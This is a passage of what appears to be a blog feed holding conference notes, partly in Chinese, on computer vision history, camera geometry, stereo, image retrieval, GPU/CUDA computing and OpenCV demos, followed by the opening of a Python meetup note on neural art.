&lt;li&gt;Larry Roberts (Father of Computer Vision)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1970's: Some progress on interpreting selected images  &lt;/li&gt;
&lt;li&gt;1980's: AI Winter ... back to basics  &lt;ul&gt;
&lt;li&gt;1984: Perceptual Organization and Visual Recognition, David Lowe  &lt;/li&gt;
&lt;li&gt;Blending  &lt;/li&gt;
&lt;li&gt;Shape from shading  &lt;ul&gt;
&lt;li&gt;用三角函數找出反光的角度建模  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Detection  &lt;/li&gt;
&lt;li&gt;From Science to Engineering  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1990's: structure, segmentation and face recognition  &lt;/li&gt;
&lt;li&gt;2000's: more object classes, computational photography, video processing  &lt;ul&gt;
&lt;li&gt;重新對焦的照相機  &lt;/li&gt;
&lt;li&gt;Texture Sythesis  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010's: Deep Learning is Back!!  &lt;ul&gt;
&lt;li&gt;AlexNet NIPS 2012  &lt;/li&gt;
&lt;li&gt;DeepFace CVPR 2014  &lt;/li&gt;
&lt;li&gt;DeepPose CVPR 2014  &lt;/li&gt;
&lt;li&gt;Show, Attend and Tell ICML 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Basic parts of Computer Vision&lt;/h2&gt;
&lt;h3&gt;Reference Books&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"Multiple View Geometry in Computer Vision", Richard Hartley and Andrew Zisserman  &lt;ul&gt;
&lt;li&gt;A good book to get started on camera geometry  &lt;/li&gt;
&lt;li&gt;More math heavry but very old school  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://szeliski.org/Book/"&gt;"Computer Vision: Algorithms and Applications", Richard Szeliski&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;More balanced mix between math and application  &lt;/li&gt;
&lt;li&gt;Freely available online.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Image Formation and 2D Image Processing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Image formation  &lt;ul&gt;
&lt;li&gt;照相原理：散射會造成無法成像，所以透過針孔（作為 barrier），使其成像。  &lt;ul&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;光線不足，所以很暗  &lt;/li&gt;
&lt;li&gt;針孔太大的話，成像會變模糊，所以加上透鏡輔助。  &lt;ul&gt;
&lt;li&gt;Circle of Confusion  &lt;ul&gt;
&lt;li&gt;有散景表示你的鏡頭光圈夠大，代表你是有錢人。 XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Modeling Projection  &lt;ul&gt;
&lt;li&gt;The coordinate system  &lt;ul&gt;
&lt;li&gt;Homogeneous Coordinations  &lt;ul&gt;
&lt;li&gt;3D 轉 2D  &lt;/li&gt;
&lt;li&gt;4D 轉 3D  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Projection equations  &lt;/li&gt;
&lt;li&gt;Camera parameters  &lt;ul&gt;
&lt;li&gt;外部參數(extrinsics)  &lt;/li&gt;
&lt;li&gt;內部參數(intrinsics)  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ai.stanford.edu/~saumitro/projektiv/"&gt;http://ai.stanford.edu/~saumitro/projektiv/&lt;/a&gt; 可以透過這個網址來瞭解外部參數和內部參數實際上的影響  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distortion （扭曲）  &lt;ul&gt;
&lt;li&gt;Types  &lt;ul&gt;
&lt;li&gt;Pin Cushion Distortion（針包）  &lt;/li&gt;
&lt;li&gt;Barrel Distortion （木桶）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Camera Calibration （攝影機校正）  &lt;ul&gt;
&lt;li&gt;使用時機：把扭曲移除、改變照片的角度、要辨認轉了角度的物件畫面 (Low Level Projection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tilt-shift  &lt;ul&gt;
&lt;li&gt;Digital Color Images  &lt;ul&gt;
&lt;li&gt;Bayer Filter  &lt;ul&gt;
&lt;li&gt;人對綠色比較敏感，對藍色比較不敏感。  &lt;/li&gt;
&lt;li&gt;彩色的照片是 3 個黑白的 RGB 疊加起來  &lt;/li&gt;
&lt;li&gt;Many early algorithms use greyscale instead of color images, Why?  &lt;ul&gt;
&lt;li&gt;早期只有灰階照片  &lt;/li&gt;
&lt;li&gt;彩色會有偏差  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Filtering  &lt;ul&gt;
&lt;li&gt;Sliding Window  &lt;/li&gt;
&lt;li&gt;Sharpening filter (Unsharp Mask)  &lt;/li&gt;
&lt;li&gt;Vertical Edge  &lt;/li&gt;
&lt;li&gt;Horizontal Edge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Epipolar geomerty and stereo matching&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Recovering structure from a single view  &lt;ul&gt;
&lt;li&gt;Intrinsic ambiguity of the mapping from 3D to image (2D)  &lt;/li&gt;
&lt;li&gt;2D 是無法直接確定物體距離與深度的，必須用兩個眼睛來看，三角定位。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Epipolar_geometry"&gt;Epipolar geomerty&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Parallel Images Plane  &lt;/li&gt;
&lt;li&gt;Forward translation  &lt;/li&gt;
&lt;li&gt;Epipolar line  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=sKJeTaIEldM"&gt;The "Vertigo" Effect&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Epipolar Constraint (F)  &lt;ul&gt;
&lt;li&gt;Estimating F  &lt;ul&gt;
&lt;li&gt;The Eight-Point Algorithm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fundamental Matrix 很重要！  &lt;/li&gt;
&lt;li&gt;Rectification  &lt;ul&gt;
&lt;li&gt;Your basic stereo algorithm  &lt;/li&gt;
&lt;li&gt;Triangulation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Depth Map Results  &lt;/li&gt;
&lt;li&gt;Active stereo with structured light  &lt;ul&gt;
&lt;li&gt;Data Acquisition  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Structure from motion and tracking&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Finding Path Through the World's Photos  &lt;/li&gt;
&lt;li&gt;Pose Estimation  &lt;/li&gt;
&lt;li&gt;Structure from motion  &lt;ul&gt;
&lt;li&gt;Tracking  &lt;ul&gt;
&lt;li&gt;找特徵點去追蹤，然後解出結構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Stitching and computational photography&lt;/h3&gt;
&lt;p&gt;如何把一堆照片合起來變成一張大照片  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Image Mosaics  &lt;/li&gt;
&lt;li&gt;Recognizing Panormas  &lt;/li&gt;
&lt;li&gt;De-Ghosting  &lt;ul&gt;
&lt;li&gt;Cutout-based de-ghosting  &lt;ul&gt;
&lt;li&gt;Cutout-based compositing  &lt;/li&gt;
&lt;li&gt;Photomontage  &lt;/li&gt;
&lt;li&gt;可以把好幾張裏面有不同人閉眼的照片合成一張沒有人閉眼的照片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Poisson Image Editing  &lt;ul&gt;
&lt;li&gt;Possion Equation: 微分、微分、再積分  &lt;/li&gt;
&lt;li&gt;照片合成特效  &lt;/li&gt;
&lt;li&gt;Seamless Poisson cloning  &lt;/li&gt;
&lt;li&gt;Face Cloning  &lt;/li&gt;
&lt;li&gt;Texture Swapping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interactive Mobile Panorama  &lt;/li&gt;
&lt;li&gt;High Dynamic Range Imaging (HDR)  &lt;ul&gt;
&lt;li&gt;The real word is high dynamic range  &lt;ul&gt;
&lt;li&gt;Typical cameras have limited dynamic range  &lt;ul&gt;
&lt;li&gt;Solution: Merge multiple exposures  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Varying Exposure  &lt;/li&gt;
&lt;li&gt;Tone Mapping  &lt;/li&gt;
&lt;li&gt;Simple Global Operator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interactive Local Adjustment of Tonal Values  &lt;ul&gt;
&lt;li&gt;Tonal （色調） Manipulation  &lt;/li&gt;
&lt;li&gt;Constraint Propagation  &lt;/li&gt;
&lt;li&gt;Touch-Tone: Point-and-Swipe Image Editing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Visual Recognition and Query&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1989  &lt;ul&gt;
&lt;li&gt;MNIST, Backpropagation applied to handwritten zip code recognition  &lt;/li&gt;
&lt;li&gt;Character Recognition (LeNet)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1998, Neural Network-Based Face Detection  &lt;/li&gt;
&lt;li&gt;1999, SIFT (Scale Invariant Feature Transform)  &lt;ul&gt;
&lt;li&gt;Object Recognition from Local Scale-Invariant Features, Lowe, ICCV 1999.  &lt;/li&gt;
&lt;li&gt;No more sliding windows (interest points)  &lt;/li&gt;
&lt;li&gt;Better features (use more computation)  &lt;/li&gt;
&lt;li&gt;找出來的特徵點會是一個球，而不是邊邊角角。  &lt;/li&gt;
&lt;li&gt;Better Descriptor  &lt;ul&gt;
&lt;li&gt;Image gradients =&amp;gt; Keypoint descriptor  &lt;/li&gt;
&lt;li&gt;Truncated normalization (globally)  &lt;/li&gt;
&lt;li&gt;高維度的球  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What worked  &lt;ul&gt;
&lt;li&gt;Object instance recognition  &lt;/li&gt;
&lt;li&gt;Panaroma  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What failed?  &lt;ul&gt;
&lt;li&gt;無法認東西  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2001, Rapid Object Detection using a Boosted Cascade of Simple Features, Viola and Jones  &lt;ul&gt;
&lt;li&gt;Why did it work?  &lt;ul&gt;
&lt;li&gt;Simple Features (Haar wavelets)  &lt;/li&gt;
&lt;li&gt;假設光線都是從上打下來，直接去認眼睛和鼻子的陰影，覺得有可能的保留，沒可能的就丟掉，所以速度很快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why did it fail?  &lt;ul&gt;
&lt;li&gt;側面就無法 work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2003, Constellatioin model (redux) (related to SIFT)  &lt;ul&gt;
&lt;li&gt;Object Class Recognition by Unsupervised Scale-Invariant Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2005, HOG (Histograms of oriented gradients) (related to SIFT)  &lt;ul&gt;
&lt;li&gt;Normalize locally not globally  &lt;/li&gt;
&lt;li&gt;Why worked?  &lt;ul&gt;
&lt;li&gt;Hard negative mining  &lt;/li&gt;
&lt;li&gt;Computers are fast enought  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What failed?  &lt;ul&gt;
&lt;li&gt;無法認出運動中的人，必須要站著。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2007, Pascal VOC  &lt;ul&gt;
&lt;li&gt;The PASCAL Visual Object Classes (VOC) Challenge  &lt;/li&gt;
&lt;li&gt;只有 20 個分類  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2008, DPM (Deformable parts model)  &lt;ul&gt;
&lt;li&gt;Object Detection with Discriminatively Trained Part Based Model  &lt;/li&gt;
&lt;li&gt;Star-structure  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2009, Caltech Pedestrian  &lt;/li&gt;
&lt;li&gt;2009, ImageNet  &lt;ul&gt;
&lt;li&gt;ImageNet, A Large-Scale Hierarchical Image Database  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010, SUN  &lt;ul&gt;
&lt;li&gt;SUN Database: Large-scale Scene Recognition from Abbey to Zoo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mscoco.org"&gt;MS COCO&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;over 77,000 worker hours (8+ years)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2012 DNNs  &lt;ul&gt;
&lt;li&gt;GPUs + Data  &lt;/li&gt;
&lt;li&gt;Classification vs Deteciton  &lt;ul&gt;
&lt;li&gt;Detection need to know the position of the target object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CNN, RNN  &lt;/li&gt;
&lt;li&gt;Why it fails  &lt;ul&gt;
&lt;li&gt;找不到位置的話就很難去判斷  &lt;/li&gt;
&lt;li&gt;Neural Networks are easily fooled  &lt;ul&gt;
&lt;li&gt;會把看起來完全不相關的雜訊誤判成某些物件  &lt;ul&gt;
&lt;li&gt;Neural Networks are easily fooled: High Confidence Predictions for Unrecognizable Images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PANDA: Pose Aligned Networks for Deep Attribute Modeling  &lt;/li&gt;
&lt;li&gt;DeepFace: closing the gap to  human-Level performance in fac verification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Additional Challenges  &lt;ul&gt;
&lt;li&gt;Detecgtion in context (with common sense)  &lt;ul&gt;
&lt;li&gt;加入一些常識的判斷，例如：人在普通情況下不可能在天上飛之類的等等  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model awareness  &lt;/li&gt;
&lt;li&gt;Training time (when dataset is incrementally updated)  &lt;ul&gt;
&lt;li&gt;每個公司都用大量的電腦去運算，不僅耗時，也蠻浪費電的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More science?  &lt;ul&gt;
&lt;li&gt;目前比較像是大量嘗試去找出方法，不太有系統且有科學性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【索引】多媒體檢索&lt;/h1&gt;
&lt;h2&gt;Search By Image Examples&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Still very much an open problem  &lt;/li&gt;
&lt;li&gt;Most commercial applications use a mixture of algorithms  &lt;ul&gt;
&lt;li&gt;沒有一種演算法可以完全解決這個問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Goggles in action  &lt;ul&gt;
&lt;li&gt;Text =&amp;gt; OCR  &lt;/li&gt;
&lt;li&gt;Landmarks, Books, Artwork, Wine, Logos =&amp;gt; SIFT  &lt;/li&gt;
&lt;li&gt;Contact Info  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TinEye  &lt;ul&gt;
&lt;li&gt;以圖找圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Instance Recognition  &lt;/li&gt;
&lt;li&gt;Search Structure  &lt;/li&gt;
&lt;li&gt;Possible Solutions  &lt;ul&gt;
&lt;li&gt;Find approximate words  &lt;ul&gt;
&lt;li&gt;Approximate nearest neighbour (ANN)  &lt;/li&gt;
&lt;li&gt;維度比較高，所以速度比較慢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Find lower dimensional spae to split the data  &lt;ul&gt;
&lt;li&gt;找 2D 的的資料，雖然沒那麼準確，但速度會比較快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scalable Recognition with a Vocabulary Tree  &lt;ul&gt;
&lt;li&gt;先拿一張圖找 Feature  &lt;/li&gt;
&lt;li&gt;找出來後丟到高維度的空間（約兩百多維)  &lt;/li&gt;
&lt;li&gt;會有很多不同的點  &lt;/li&gt;
&lt;li&gt;用定義好的向量距離，用 &lt;a href="https://en.wikipedia.org/wiki/K-means_clustering"&gt;K-means&lt;/a&gt; 做分群  &lt;/li&gt;
&lt;li&gt;遞迴做下去就可以得到愈多種類的分群結果  &lt;/li&gt;
&lt;li&gt;最後再把不需要的東西去掉，得到 Vocabulary Tree  &lt;/li&gt;
&lt;li&gt;得到 Vocabulary Tree 後，把每個 Feature 丟進去，會知道在 Vocabulary Tree 的哪個節點  &lt;/li&gt;
&lt;li&gt;如果該 Feature 的結果只指向一張圖的話，就很有可能是這張圖。  &lt;/li&gt;
&lt;li&gt;但當某個節點有關的圖愈多的話，entropy 愈高，結果就愈難判斷。  &lt;/li&gt;
&lt;li&gt;這時候可以使用 &lt;a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"&gt;tf-idf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【加速】圖形處理器與深度學習 (GPU and Computation)&lt;/h1&gt;
&lt;h2&gt;Parallel Processing and GPU&lt;/h2&gt;
&lt;h3&gt;Parallel Computing Goals&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;To slove your problem in less time  &lt;ul&gt;
&lt;li&gt;平行化去處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In order to parallelize a problem  &lt;ul&gt;
&lt;li&gt;要去看哪邊有關聯性，並確定處理這些關聯性對演算法的影響。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Types of Parallelism&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Multiple Programs  &lt;ul&gt;
&lt;li&gt;Multi-tasking  &lt;/li&gt;
&lt;li&gt;Multi-threading  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Single Program  &lt;ul&gt;
&lt;li&gt;Instruction-levl parallelism  &lt;ul&gt;
&lt;li&gt;Multiple instructions in a serial program get excuted simultaneously  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data-level parallelism  &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;S&lt;/strong&gt;ingle &lt;strong&gt;I&lt;/strong&gt;nstruction, &lt;strong&gt;M&lt;/strong&gt;ultiple &lt;strong&gt;D&lt;/strong&gt;ata processing model (SIMD)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Amdahl's Law  &lt;ul&gt;
&lt;li&gt;Named after computer architect Gene Amdahl  &lt;/li&gt;
&lt;li&gt;Speedup of a parallel computer is limited by the amount of serial work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Resource Management  &lt;ul&gt;
&lt;li&gt;哲學家晚餐問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GPU Applications&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Real-time rendering. e.g. Game  &lt;/li&gt;
&lt;li&gt;Movie Effect  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GPUs Today&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;GPUs are becoming more programmable  &lt;/li&gt;
&lt;li&gt;GPUs now support 32/64 bit floating points numbers  &lt;/li&gt;
&lt;li&gt;GPUs have higher memory bandwidth than CPUs  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;NVIDIA CUDA&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Compute Unified Device Architecture  &lt;/li&gt;
&lt;li&gt;CUDA Workflow  &lt;ul&gt;
&lt;li&gt;Get a CUDA-enabled GPU  &lt;/li&gt;
&lt;li&gt;Write C/C++ like code (*.cu)  &lt;/li&gt;
&lt;li&gt;Compile with CUDA compiler (nvcc)  &lt;ul&gt;
&lt;li&gt;Generated PTX code ("Parallel Thread Execution")  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Applications auto-magically run on GPUs  &lt;ul&gt;
&lt;li&gt;Many many parallel threads  &lt;/li&gt;
&lt;li&gt;CUDA driver translate PTX code into hardware.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CUDA Overview  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;之前學 CUDA 時收集的一份不錯的 CUDA 教學系列文：&lt;a href="/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/"&gt;Nice Series of CUDA Tutorials on ptt.cc&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Frameworks and Libraries&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;MATLAB  &lt;/li&gt;
&lt;li&gt;BLAS Library (Basic Linear Algebra Subprograms)  &lt;ul&gt;
&lt;li&gt;和 Fortran 同年代的產物  &lt;/li&gt;
&lt;li&gt;Processor vendors implement their BLAS library  &lt;ul&gt;
&lt;li&gt;e.g., Intel MKL (Math Kernel Library)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;cuBLAS - CUDA version, very fast  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NVIDIA Thrust Library  &lt;ul&gt;
&lt;li&gt;A little like C++ STL library for CUDA  &lt;/li&gt;
&lt;li&gt;Very few lines of code for vector manipulation  &lt;/li&gt;
&lt;li&gt;Fast implementation of parallel primitives  &lt;ul&gt;
&lt;li&gt;reduce  &lt;ul&gt;
&lt;li&gt;mapreduce  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;scan  &lt;/li&gt;
&lt;li&gt;sort  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NVIDIA cuDNN  &lt;ul&gt;
&lt;li&gt;Deep Neural Network Library for CUDA  &lt;/li&gt;
&lt;li&gt;TensorFlow, Caffe, Microsoft CNTK  &lt;/li&gt;
&lt;li&gt;Deep Learning Getting Started Advises  &lt;ul&gt;
&lt;li&gt;Borrow (steal if you must) a modern GPU  &lt;/li&gt;
&lt;li&gt;Use &lt;a href="http://caffe.berkeleyvision.org"&gt;Caffe&lt;/a&gt; for your deep learning projects  &lt;/li&gt;
&lt;li&gt;Browse through the Caffe Model Zoo and try out the existing (pre-trained) models (AlexNet, R-CNN and GooLeNet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;電腦視覺之實作演示&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Introduct OpenCV by the official tutorials  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Core functionality  &lt;/li&gt;
&lt;li&gt;Image processing  &lt;/li&gt;
&lt;li&gt;Demos  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python, OpenCV, Numpy  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Canny Edge Detection  &lt;ol&gt;
&lt;li&gt;Detect unique edges  &lt;ul&gt;
&lt;li&gt;不管是 strong edge 或 weak edge 在經過微分後都會產生一個 peak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Voting (Use 2 threshold)  &lt;ul&gt;
&lt;li&gt;Strong edge: Always accept.  &lt;/li&gt;
&lt;li&gt;Weak edge: Accept when connected.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是很多後續演算法的基礎  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Histogram  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;OpenCV QR Drive  &lt;ul&gt;
&lt;li&gt;QR code Marker Detection  &lt;ul&gt;
&lt;li&gt;1:1:3:1:1 black-white markers at the coners  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to detect 11311?  &lt;ul&gt;
&lt;li&gt;Only need to use raster scan  &lt;/li&gt;
&lt;li&gt;Use &lt;a href="https://en.wikipedia.org/wiki/Otsu%27s_method"&gt;Otsu algorithm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Thresholding: leave only white and black  &lt;/li&gt;
&lt;li&gt;A binarization algorithm that minimize the weighted intra-class variance algorighm for bimodal distributioin.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Detect the most bright points  &lt;ol&gt;
&lt;li&gt;Dilate  &lt;/li&gt;
&lt;li&gt;Equality check  &lt;/li&gt;
&lt;li&gt;Threshold  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Dilation and thresholding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Make a little PiBorg which will chase the $1,000 NTD bill.  &lt;ul&gt;
&lt;li&gt;The PiBorg (RPi + Motor) aka &lt;a href="https://www.youtube.com/watch?v=s3Qdsn401H0"&gt;DoodleBorg&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Camshift (WACV 98)  &lt;/li&gt;
&lt;li&gt;Meanshift  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.opencv.org/3.1.0/db/df8/tutorial_py_meanshift.html"&gt;OpenCV: Meanshift and Camshift&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Camshift 比 Meanshift 多了一個 scale 的選項  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;Basic OpenCV functionalities  &lt;/li&gt;
&lt;li&gt;OpenCV and image processing  &lt;/li&gt;
&lt;li&gt;OpenCV and detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Data Science"></category><category term="Deep Learning"></category><category term="Conf"></category></entry><entry><title>Taipei.py 20160421 Meetup Note</title><link href="https://blog.m157q.tw/posts/2016/04/21/taipei-py-20160421-meetup-note/" rel="alternate"></link><published>2016-04-22T00:15:00+08:00</published><updated>2016-04-22T00:15:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-04-21:posts/2016/04/21/taipei-py-20160421-meetup-note/</id><summary type="html">&lt;p&gt;&lt;a href="http://www.meetup.com/Taipei-py/events/230083921/"&gt;http://www.meetup.com/Taipei-py/events/230083921/&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Topic 1: Neural Art and Neural Doodle in Python&lt;br /&gt;
Topic 2: Experience from KKBOX  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Neural Art and Neural Doodle in Python&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-art-english-version"&gt;Neural Art&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-doodle"&gt;Neural Doodle&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-art-english-version"&gt;Neural Art&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Neural Networks - 模擬人腦的神經元  &lt;ul&gt;
&lt;li&gt;Sigmoid  &lt;/li&gt;
